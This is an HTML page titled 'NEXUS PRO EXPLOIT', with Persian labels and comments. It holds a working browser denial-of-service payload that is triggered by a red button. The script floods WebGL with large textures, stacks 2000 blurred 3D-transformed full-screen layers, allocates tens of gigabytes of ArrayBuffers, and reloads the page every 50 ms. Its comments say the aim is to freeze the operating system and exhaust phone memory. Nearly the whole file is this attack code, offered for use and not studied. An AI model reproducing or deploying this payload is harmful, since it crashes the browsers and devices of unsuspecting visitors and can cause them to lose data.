<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <title>NEXUS PRO EXPLOIT</title>
    <style>
        body { background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
        #status { color: #0f0; font-family: monospace; font-size: 1.5rem; text-align: center; }
        .crash-trigger { background: red; color: white; border: none; padding: 20px 40px; font-weight: bold; cursor: pointer; border-radius: 10px; }
    </style>
</head>
<body>

    <div id="status">
        <button class="crash-trigger" onclick="forceAppCrash()">  زدن روی این گزینه باعث فریز شدن مرورگر خواهد شد</button>
        <p id="msg"></p>
    </div>

    <script>
        function forceAppCrash() {
            document.getElementById('msg').innerText = "در حال تزریق کد به موتور رندرینگ...";
            
            // مرحله ۱: حمله به درایور گرافیک (GPU Buffer Flooding)
            // این بخش باعث می‌شود کل سیستم‌عامل برای لحظه‌ای فریز شود
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
            
            setInterval(() => {
                for (let i = 0; i < 1000; i++) {
                    const texture = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, texture);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                    // ایجاد خطای درایور با استفاده از بافرهای ناتمام
                }
            }, 10);

            // مرحله ۲: بمب لایه‌های متحرک (Compositor Layer Bomb)
            // ایجاد المان‌هایی که مرورگر را مجبور به محاسبات سه بعدی سنگین می‌کند
            for (let i = 0; i < 2000; i++) {
                const div = document.createElement('div');
                div.style.cssText = `
                    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                    backdrop-filter: blur(100px) contrast(200%) invert(100%);
                    transform: translateZ(${i}px) rotateX(${i}deg);
                    will-change: transform;
                    pointer-events: none;
                `;
                document.body.appendChild(div);
            }

            // مرحله ۳: نشت حافظه سخت (TypedArray Buffer Overload)
            // این بخش رم گوشی را تا مرز انفجار می‌برد
            let leak = [];
            while(true) {
                // استفاده از ArrayBuffer برای اشغال فضای واقعی رم
                leak.push(new ArrayBuffer(1024 * 1024 * 100)); // ۱۰۰ مگابایت در هر سیکل
                if (leak.length > 500) break;
            }

            // مرحله نهایی: قفل کردن حلقه اصلی
            setInterval(() => {
                location.reload(); 
            }, 50);
        }
    </script>
</body>
</html>
